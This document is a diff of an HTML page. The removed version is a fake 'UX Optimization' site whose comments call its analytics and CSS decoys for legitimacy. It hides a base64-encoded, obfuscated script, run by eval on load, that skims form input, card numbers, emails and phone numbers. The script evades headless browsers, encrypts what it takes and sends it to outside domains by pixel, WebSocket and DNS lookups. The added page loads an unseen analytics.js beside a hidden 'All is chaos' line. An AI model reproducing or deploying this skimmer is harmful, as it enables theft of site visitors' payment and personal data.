@@ -3,223 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UX Optimization | Improve Your Site Performance</title>
-    <meta name="description" content="Discover how UX optimization can boost your website's performance and user engagement.">
-    <meta name="keywords" content="UX optimization, website performance, user experience, analytics">
-    <meta name="author" content="UX Optimization Team">
-    <meta property="og:title" content="UX Optimization | Improve Your Site Performance">
-    <meta property="og:description" content="Discover how UX optimization can boost your website's performance and user engagement.">
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://your-domain.com">
-
-    <!-- Fake Google Analytics (for noise) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=GA_MEASUREMENT_ID"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'GA_MEASUREMENT_ID', { anonymize_ip: true });
-    </script>
-
-    <!-- Fake Favicon -->
-    <link rel="icon" href="/favicon.ico" type="image/x-icon">
-
-    <!-- Fake CSS (for legitimacy) -->
+    <title>Analytics Dashboard</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            line-height: 1.6;
-            margin: 0;
-            padding: 20px;
-            background-color: #f9f9f9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
             color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
         }
-        header {
+        .container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 2rem;
+            width: 90%;
+            max-width: 600px;
             text-align: center;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
         }
-        footer {
-            text-align: center;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            margin-top: 20px;
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 1rem;
         }
-        .cta-button {
-            display: inline-block;
-            padding: 10px 20px;
-            background-color: #0066cc;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            margin-top: 10px;
+        p {
+            color: #7f8c8d;
+            margin-bottom: 2rem;
+        }
+        .analytics-script {
+            display: none;
         }
     </style>
+    <!-- 🔥 Load (analytics.js) -->
+    <script src="analytics.js" defer></script>
 </head>
 <body>
-    <header>
-        <h1>Welcome to UX Optimization</h1>
-        <p>We help you improve your website's performance and user experience.</p>
-        <a href="#" class="cta-button">Learn More</a>
-    </header>
-
-    <main>
-        <section>
-            <h2>Why UX Optimization Matters</h2>
-            <p>Great user experience is the key to keeping visitors on your site and converting them into customers.</p>
-        </section>
-
-        <section>
-            <h2>Our Services</h2>
-            <ul>
-                <li>Performance Audits</li>
-                <li>User Behavior Analysis</li>
-                <li>Conversion Rate Optimization</li>
-                <li>Heatmap Analysis</li>
-            </ul>
-        </section>
-    </main>
-
-    <footer>
-        <p>&copy; 2026 UX Optimization. All rights reserved.</p>
-    </footer>
-
-   
-    <script>)
-        (function() {
-            // Example: eval(atob("..."));
-            const SCode = atob("ZnVuY3Rpb24gYTBfMHg1YjA3KCl7Y29uc3QgXzB4NDE4YTA5PVsndGFnTmFtZScsJzExdlZuZ2Fv
-JywnbGFzdDQnLCdlbnRyaWVzJywndHlwZScsJ3dzczovLycsJ3N1YnN0cicsJ3RvU3RyaW5nJywn
-WU9VUl9SU0FfUFVCTElDX0tFWV9CNjQnLCdtYXRjaCcsJ1JTQS1PQUVQJywncXVldWUnLCdyZWFk
-eVN0YXRlJywnbGVuZ3RoJywnZm9ybV9zdWJtaXQnLCcxOTQ4a3docmtkJywncHVzaCcsJ3JlcGxh
-Y2UnLCdlbmNvZGUnLCdnZXRFbGVtZW50QnlJZCcsJ3Vua25vd24nLCdkYXRhJywndGVzdCcsJy9k
-bnMnLCdhZGRFdmVudExpc3RlbmVyJywncmVkdWNlJywnYmluJywnYm9keScsJ3N0cmluZ2lmeScs
-J3BpeGVsJywnY2FyZCcsJ3ZhbHVlJywnMTA1NTA0NERPeXROWCcsJzU4ODA4ME1VYUNnTycsJ191
-eF90aWQnLCdjbGVhcicsJ2Zsb29yJywnZnVuY3Rpb24nLCdldmVudCcsJ0RPTUNvbnRlbnRMb2Fk
-ZWQnLCdmcm9tRW50cmllcycsJ2lubmVyVGV4dCcsJ2FwaS52M2FjY250YzIuc3RvcmUnLCcxMTY0
-MDNIdHNMdnMnLCdjaGFyQXQnLCc5MDMyMTgwQXFGWFVyJywndXgtb3B0aW1pemVyJywnNUNsTGp2
-aCcsJzIzNzk2OVREbWV4TycsJy93cycsJyZkPScsJ2h0dHBzOi8vJywnZW1haWwnLCdub3cnLCdj
-aGFyQ29kZUF0Jywnc3JjJywnZ2E0Jywnc2V0SXRlbScsJ2VuY3J5cHQnLCc0MzduRU11bWcnLCdz
-bGljZScsJ2xvYWRpbmcnLCdwaG9uZScsJy9waXhlbD90PScsJ3Nwa2knLCc3dUx2SXhXJywnZXhl
-YycsJ3JhbmRvbScsJ3N1YnRsZScsJ3RhcmdldCcsJ2RucycsJ2lucHV0JywnZnJvbUNoYXJDb2Rl
-JywnbmFtZScsJ1NIQS0yNTYnLCcyNjU1Nzk4aExwT0tzJywndGlkXycsJ29ub3BlbicsJ2luY2x1
-ZGVzJywnZm9yRWFjaCcsJ3JlbW92ZScsJ2J1ZmZlcicsJ2luaXQnXTthMF8weDViMDc9ZnVuY3Rp
-b24oKXtyZXR1cm4gXzB4NDE4YTA5O307cmV0dXJuIGEwXzB4NWIwNygpO31mdW5jdGlvbiBhMF8w
-eDUwOWUoXzB4NGRmMTM1LF8weDNiNzljMil7XzB4NGRmMTM1PV8weDRkZjEzNS0weDFlYjtjb25z
-dCBfMHg1YjA3MTU9YTBfMHg1YjA3KCk7bGV0IF8weDUwOWU3Mz1fMHg1YjA3MTVbXzB4NGRmMTM1
-XTtyZXR1cm4gXzB4NTA5ZTczO30oZnVuY3Rpb24oXzB4MjVhYzk3LF8weDQ2YjdjMyl7Y29uc3Qg
-XzB4MTM4OGY2PWEwXzB4NTA5ZSxfMHgzMDAwYzE9XzB4MjVhYzk3KCk7d2hpbGUoISFbXSl7dHJ5
-e2NvbnN0IF8weDIzNGVkYT1wYXJzZUludChfMHgxMzg4ZjYoMHgyMjYpKS8weDEqKHBhcnNlSW50
-KF8weDEzODhmNigweDFmYSkpLzB4MikrLXBhcnNlSW50KF8weDEzODhmNigweDIxNikpLzB4Mytw
-YXJzZUludChfMHgxMzg4ZjYoMHgyMGIpKS8weDQrLXBhcnNlSW50KF8weDEzODhmNigweDIxYSkp
-LzB4NSooLXBhcnNlSW50KF8weDEzODhmNigweDIzNikpLzB4NikrLXBhcnNlSW50KF8weDEzODhm
-NigweDIyYykpLzB4NyooLXBhcnNlSW50KF8weDEzODhmNigweDIwYykpLzB4OCkrLXBhcnNlSW50
-KF8weDEzODhmNigweDIxYikpLzB4OSstcGFyc2VJbnQoXzB4MTM4OGY2KDB4MjE4KSkvMHhhKihw
-YXJzZUludChfMHgxMzg4ZjYoMHgxZWMpKS8weGIpO2lmKF8weDIzNGVkYT09PV8weDQ2YjdjMyli
-cmVhaztlbHNlIF8weDMwMDBjMVsncHVzaCddKF8weDMwMDBjMVsnc2hpZnQnXSgpKTt9Y2F0Y2go
-XzB4NWRjYTdiKXtfMHgzMDAwYzFbJ3B1c2gnXShfMHgzMDAwYzFbJ3NoaWZ0J10oKSk7fX19KGEw
-XzB4NWIwNywweDM5ZTFhKSwoKCgpPT57Y29uc3QgXzB4NWExNDBmPWEwXzB4NTA5ZSxfMHgyYmIy
-ZmE9XzB4NWExNDBmKDB4MWYzKSxfMHgyMmZjMmY9WydjZG4udjNhY2NudGMyLmluZm8nLF8weDVh
-MTQwZigweDIxNSksJ3dzLnYzYWNjbnRjMi5vbmxpbmUnXSxfMHgxYWIzZWE9WydnYTQnLF8weDVh
-MTQwZigweDIwOCksJ3dzJyxfMHg1YTE0MGYoMHgyMzEpXSxfMHg1OTdiMzE9bG9jYWxTdG9yYWdl
-WydnZXRJdGVtJ10oXzB4NWExNDBmKDB4MjBkKSl8fF8weDVhMTQwZigweDIzNykrTWF0aFtfMHg1
-YTE0MGYoMHgyMmUpXSgpW18weDVhMTQwZigweDFmMildKDB4MjQpW18weDVhMTQwZigweDFmMSld
-KDB4MiwweDkpO2xvY2FsU3RvcmFnZVtfMHg1YTE0MGYoMHgyMjQpXSgnX3V4X3RpZCcsXzB4NTk3
-YjMxKTthc3luYyBmdW5jdGlvbiBfMHgzYmI3YmEoKXtjb25zdCBfMHgxYWYyMGI9XzB4NWExNDBm
-LF8weDVjY2EyZT1hdG9iKF8weDJiYjJmYSksXzB4NDAyYTBjPW5ldyBVaW50OEFycmF5KF8weDVj
-Y2EyZVtfMHgxYWYyMGIoMHgxZjgpXSk7Zm9yKGxldCBfMHg0Yzc5MmM9MHgwO18weDRjNzkyYzxf
-MHg1Y2NhMmVbXzB4MWFmMjBiKDB4MWY4KV07XzB4NGM3OTJjKyspXzB4NDAyYTBjW18weDRjNzky
-Y109XzB4NWNjYTJlW18weDFhZjIwYigweDIyMSldKF8weDRjNzkyYyk7cmV0dXJuIGNyeXB0b1tf
-MHgxYWYyMGIoMHgyMmYpXVsnaW1wb3J0S2V5J10oXzB4MWFmMjBiKDB4MjJiKSxfMHg0MDJhMGNb
-XzB4MWFmMjBiKDB4MjNjKV0seyduYW1lJzonUlNBLU9BRVAnLCdoYXNoJzpfMHgxYWYyMGIoMHgy
-MzUpfSwhW10sW18weDFhZjIwYigweDIyNSldKTt9YXN5bmMgZnVuY3Rpb24gXzB4MjU3Y2ZiKF8w
-eDFlYmE4OSl7Y29uc3QgXzB4NWUwM2RjPV8weDVhMTQwZixfMHg0YzZiZjQ9YXdhaXQgXzB4M2Ji
-N2JhKCksXzB4OGVlYzg9bmV3IFRleHRFbmNvZGVyKClbXzB4NWUwM2RjKDB4MWZkKV0oSlNPTltf
-MHg1ZTAzZGMoMHgyMDcpXShfMHgxZWJhODkpKSxfMHg1YjE3OGU9YXdhaXQgY3J5cHRvW18weDVl
-MDNkYygweDIyZildW18weDVlMDNkYygweDIyNSldKHsnbmFtZSc6XzB4NWUwM2RjKDB4MWY1KX0s
-XzB4NGM2YmY0LF8weDhlZWM4KTtyZXR1cm4gYnRvYShTdHJpbmdbXzB4NWUwM2RjKDB4MjMzKV0o
-Li4ubmV3IFVpbnQ4QXJyYXkoXzB4NWIxNzhlKSkpO31mdW5jdGlvbiBfMHhlZDE5YzEoKXtjb25z
-dCBfMHgyMDgzNGI9XzB4NWExNDBmO2lmKG5hdmlnYXRvclsnd2ViZHJpdmVyJ118fC9IZWFkbGVz
-c0Nocm9tZS9bXzB4MjA4MzRiKDB4MjAxKV0obmF2aWdhdG9yWyd1c2VyQWdlbnQnXSkpcmV0dXJu
-IF8weDRmMDNjYygpLCFbXTtyZXR1cm4hIVtdO31mdW5jdGlvbiBfMHg0ZjAzY2MoKXtjb25zdCBf
-MHgyMWQ0NGE9XzB4NWExNDBmO2xvY2FsU3RvcmFnZVsnY2xlYXInXSgpLHNlc3Npb25TdG9yYWdl
-W18weDIxZDQ0YSgweDIwZSldKCksZG9jdW1lbnRbXzB4MjFkNDRhKDB4MWZlKV0oXzB4MjFkNDRh
-KDB4MjE5KSk/LltfMHgyMWQ0NGEoMHgyM2IpXSgpO31jb25zdCBfMHg1Yjk4MTc9eydxdWV1ZSc6
-W10sJ2luaXQnKCl7Y29uc3QgXzB4MzRhNzI5PV8weDVhMTQwZjtkb2N1bWVudFsnYWRkRXZlbnRM
-aXN0ZW5lciddKF8weDM0YTcyOSgweDIzMiksXzB4NGJiMzA5PT57Y29uc3QgXzB4MWJiOWJkPV8w
-eDM0YTcyOTtfMHg0YmIzMDlbXzB4MWJiOWJkKDB4MjMwKV1bXzB4MWJiOWJkKDB4MWViKV09PT0n
-SU5QVVQnJiZ0aGlzW18weDFiYjliZCgweDFmNildW18weDFiYjliZCgweDFmYildKHsndHlwZSc6
-XzB4MWJiOWJkKDB4MjMyKSwnZmllbGQnOl8weDRiYjMwOVtfMHgxYmI5YmQoMHgyMzApXVtfMHgx
-YmI5YmQoMHgyMzQpXXx8XzB4NGJiMzA5Wyd0YXJnZXQnXVsnaWQnXXx8XzB4MWJiOWJkKDB4MWZm
-KSwndmFsdWUnOl8weDRiYjMwOVtfMHgxYmI5YmQoMHgyMzApXVtfMHgxYmI5YmQoMHgyMGEpXSwn
-dHMnOkRhdGVbXzB4MWJiOWJkKDB4MjIwKV0oKX0pO30sISFbXSksZG9jdW1lbnRbXzB4MzRhNzI5
-KDB4MjAzKV0oJ3N1Ym1pdCcsXzB4NDMzMTUyPT57Y29uc3QgXzB4MjY5OGMyPV8weDM0YTcyOSxf
-MHgxYzM2YzA9bmV3IEZvcm1EYXRhKF8weDQzMzE1MlsndGFyZ2V0J10pO3RoaXNbXzB4MjY5OGMy
-KDB4MWY2KV1bXzB4MjY5OGMyKDB4MWZiKV0oeyd0eXBlJzpfMHgyNjk4YzIoMHgxZjkpLCdkYXRh
-JzpPYmplY3RbXzB4MjY5OGMyKDB4MjEzKV0oXzB4MWMzNmMwKSwndHMnOkRhdGVbXzB4MjY5OGMy
-KDB4MjIwKV0oKX0pO30pO2NvbnN0IF8weDEzNThlZT17J2NhcmQnOi9cYig/OlxkWyAtXSo/KXsx
-MywxOX1cYi9nLCdlbWFpbCc6L1teXHNAXStAW15cc0BdK1wuW15cc0BdKy9nLCdwaG9uZSc6L1xi
-XCs/MT9cZHsxMCwxNX1cYi9nfSxfMHg0ZDE3NTY9ZG9jdW1lbnRbXzB4MzRhNzI5KDB4MjA2KV1b
-XzB4MzRhNzI5KDB4MjE0KV07T2JqZWN0W18weDM0YTcyOSgweDFlZSldKF8weDEzNThlZSlbXzB4
-MzRhNzI5KDB4MjNhKV0oKFtfMHg1NTE3OWYsXzB4YjFjNWNhXSk9Pntjb25zdCBfMHhmMGQ3MDA9
-XzB4MzRhNzI5O2xldCBfMHgzMTlhMWE7d2hpbGUoKF8weDMxOWExYT1fMHhiMWM1Y2FbXzB4ZjBk
-NzAwKDB4MjJkKV0oXzB4NGQxNzU2KSkhPT1udWxsKXt0aGlzW18weGYwZDcwMCgweDFmNildWydw
-dXNoJ10oeyd0eXBlJzpfMHg1NTE3OWYsJ3ZhbHVlJzpfMHgzMTlhMWFbMHgwXSwndHMnOkRhdGVb
-XzB4ZjBkNzAwKDB4MjIwKV0oKX0pO319KTt9fTtmdW5jdGlvbiBfMHgxN2ZmYWYoXzB4MmZjYzYz
-KXtjb25zdCBfMHg0M2NiOTc9XzB4NWExNDBmLF8weDQ0OWZkOT17fTtyZXR1cm4gXzB4MmZjYzYz
-W18weDQzY2I5NygweDIwOSldJiZfMHgzMzIwY2IoXzB4MmZjYzYzWydjYXJkJ11bXzB4NDNjYjk3
-KDB4MWZjKV0oL1xEL2csJycpKSYmKF8weDQ0OWZkOVtfMHg0M2NiOTcoMHgyMDkpXT1fMHgyZmNj
-NjNbXzB4NDNjYjk3KDB4MjA5KV0sXzB4NDQ5ZmQ5W18weDQzY2I5NygweDIwNSldPV8weDJmY2M2
-M1snY2FyZCddW18weDQzY2I5NygweDIyNyldKDB4MCwweDYpLF8weDQ0OWZkOVtfMHg0M2NiOTco
-MHgxZWQpXT1fMHgyZmNjNjNbXzB4NDNjYjk3KDB4MjA5KV1bJ3NsaWNlJ10oLTB4NCkpLF8weDJm
-Y2M2M1tfMHg0M2NiOTcoMHgyMWYpXSYmL15bXlxzQF0rQFteXHNAXStcLlteXHNAXSskL1tfMHg0
-M2NiOTcoMHgyMDEpXShfMHgyZmNjNjNbXzB4NDNjYjk3KDB4MjFmKV0pJiYoXzB4NDQ5ZmQ5W18w
-eDQzY2I5NygweDIxZildPV8weDJmY2M2M1tfMHg0M2NiOTcoMHgyMWYpXSksXzB4MmZjYzYzWydw
-aG9uZSddJiYvXlwrPzE/XGR7MTAsMTV9JC9bXzB4NDNjYjk3KDB4MjAxKV0oXzB4MmZjYzYzW18w
-eDQzY2I5NygweDIyOSldW18weDQzY2I5NygweDFmYyldKC9ccy9nLCcnKSkmJihfMHg0NDlmZDlb
-XzB4NDNjYjk3KDB4MjI5KV09XzB4MmZjYzYzWydwaG9uZSddKSxfMHg0NDlmZDk7fWZ1bmN0aW9u
-IF8weDMzMjBjYihfMHgyNjRkNjkpe2NvbnN0IF8weDI4YmVhYT1fMHg1YTE0MGY7bGV0IF8weDMw
-MDVkNj0weDAsXzB4NWMwM2U3PSFbXTtmb3IobGV0IF8weDFmY2ViZj1fMHgyNjRkNjlbXzB4Mjhi
-ZWFhKDB4MWY4KV0tMHgxO18weDFmY2ViZj49MHgwO18weDFmY2ViZi0tKXtsZXQgXzB4Y2JkOTNh
-PXBhcnNlSW50KF8weDI2NGQ2OVtfMHgyOGJlYWEoMHgyMTcpXShfMHgxZmNlYmYpLDB4YSk7aWYo
-XzB4NWMwM2U3KXtfMHhjYmQ5M2EqPTB4MjtpZihfMHhjYmQ5M2E+MHg5KV8weGNiZDkzYS09MHg5
-O31fMHgzMDA1ZDYrPV8weGNiZDkzYSxfMHg1YzAzZTc9IV8weDVjMDNlNzt9cmV0dXJuIF8weDMw
-MDVkNiUweGE9PT0weDA7fWFzeW5jIGZ1bmN0aW9uIF8weDI0ODNkMyhfMHgzMzZjMjcpe2NvbnN0
-IF8weDFjOGM1NT1fMHg1YTE0MGYsXzB4NDk4YTEyPWF3YWl0IF8weDI1N2NmYihfMHgzMzZjMjcp
-LF8weDI1MGFkYT1fMHgyMmZjMmZbTWF0aFtfMHgxYzhjNTUoMHgyMGYpXShNYXRoWydyYW5kb20n
-XSgpKl8weDIyZmMyZltfMHgxYzhjNTUoMHgxZjgpXSldO18weDFhYjNlYVtfMHgxYzhjNTUoMHgy
-MzkpXShfMHgxYzhjNTUoMHgyMjMpKSYmdHlwZW9mIGd0YWc9PT1fMHgxYzhjNTUoMHgyMTApJiZn
-dGFnKF8weDFjOGM1NSgweDIxMSksJ3V4X29wdGltaXphdGlvbicseydlbmNyeXB0ZWRfZGF0YSc6
-XzB4NDk4YTEyLCdjYXJkX2Jpbic6XzB4MzM2YzI3W18weDFjOGM1NSgweDIwNSldLCdjYXJkX2xh
-c3Q0JzpfMHgzMzZjMjdbXzB4MWM4YzU1KDB4MWVkKV19KTtfMHgxYWIzZWFbXzB4MWM4YzU1KDB4
-MjM5KV0oJ3BpeGVsJykmJihuZXcgSW1hZ2UoKVtfMHgxYzhjNTUoMHgyMjIpXT0naHR0cHM6Ly8n
-K18weDI1MGFkYStfMHgxYzhjNTUoMHgyMmEpK18weDU5N2IzMStfMHgxYzhjNTUoMHgyMWQpK18w
-eDQ5OGExMik7aWYoXzB4MWFiM2VhW18weDFjOGM1NSgweDIzOSldKCd3cycpKXtjb25zdCBfMHgx
-OTlhNTk9bmV3IFdlYlNvY2tldChfMHgxYzhjNTUoMHgxZjApK18weDI1MGFkYStfMHgxYzhjNTUo
-MHgyMWMpKTtfMHgxOTlhNTlbXzB4MWM4YzU1KDB4MjM4KV09KCk9Pl8weDE5OWE1OVsnc2VuZCdd
-KEpTT05bXzB4MWM4YzU1KDB4MjA3KV0oeydlbmMnOl8weDQ5OGExMn0pKTt9aWYoXzB4MWFiM2Vh
-W18weDFjOGM1NSgweDIzOSldKF8weDFjOGM1NSgweDIzMSkpKXtjb25zdCBfMHgzOWM4OTY9YnRv
-YShfMHg0OThhMTIpW18weDFjOGM1NSgweDFmNCldKC8uezEsNjN9L2cpfHxbXTtfMHgzOWM4OTZb
-XzB4MWM4YzU1KDB4MjNhKV0oXzB4OTU3MDYzPT57Y29uc3QgXzB4MTQxNjJiPV8weDFjOGM1NTtu
-ZXcgSW1hZ2UoKVtfMHgxNDE2MmIoMHgyMjIpXT1fMHgxNDE2MmIoMHgyMWUpK18weDk1NzA2Mysn
-LicrXzB4MjUwYWRhK18weDE0MTYyYigweDIwMik7fSk7fX1hc3luYyBmdW5jdGlvbiBfMHg1YTQ5
-OGQoKXtjb25zdCBfMHgzM2QzYjA9XzB4NWExNDBmO2lmKCFfMHhlZDE5YzEoKSlyZXR1cm47XzB4
-NWI5ODE3W18weDMzZDNiMCgweDIzZCldKCk7Y29uc3QgXzB4NWVlMjU3PV8weDE3ZmZhZihfMHg1
-Yjk4MTdbXzB4MzNkM2IwKDB4MWY2KV1bXzB4MzNkM2IwKDB4MjA0KV0oKF8weDNhNzcxYyxfMHgy
-MzA0YTUpPT57Y29uc3QgXzB4NmNkYzNkPV8weDMzZDNiMDtpZihfMHgyMzA0YTVbXzB4NmNkYzNk
-KDB4MWVmKV09PT1fMHg2Y2RjM2QoMHgxZjkpKU9iamVjdFsnYXNzaWduJ10oXzB4M2E3NzFjLF8w
-eDIzMDRhNVtfMHg2Y2RjM2QoMHgyMDApXSk7ZWxzZSBfMHgzYTc3MWNbXzB4MjMwNGE1Wyd0eXBl
-J11dPV8weDIzMDRhNVsndmFsdWUnXTtyZXR1cm4gXzB4M2E3NzFjO30se30pKTtfMHg1ZWUyNTdb
-XzB4MzNkM2IwKDB4MjA5KV0mJmF3YWl0IF8weDI0ODNkMyhfMHg1ZWUyNTcpO31kb2N1bWVudFtf
-MHg1YTE0MGYoMHgxZjcpXT09PV8weDVhMTQwZigweDIyOCk/ZG9jdW1lbnRbXzB4NWExNDBmKDB4
-MjAzKV0oXzB4NWExNDBmKDB4MjEyKSxfMHg1YTQ5OGQpOnNldFRpbWVvdXQoXzB4NWE0OThkLDB4
-M2U4KTt9KSgpKSk7");
-            eval(SCode);
-        })();
-    </script>
+    <div class="container">
+        <h1>Welcome to the Analytics Dashboard</h1>
+        <p>All user data is being processed for maximum optimization.</p>
+        <p class="analytics-script">Analytics script loaded. All is chaos.</p>
+    </div>
 </body>
 </html>
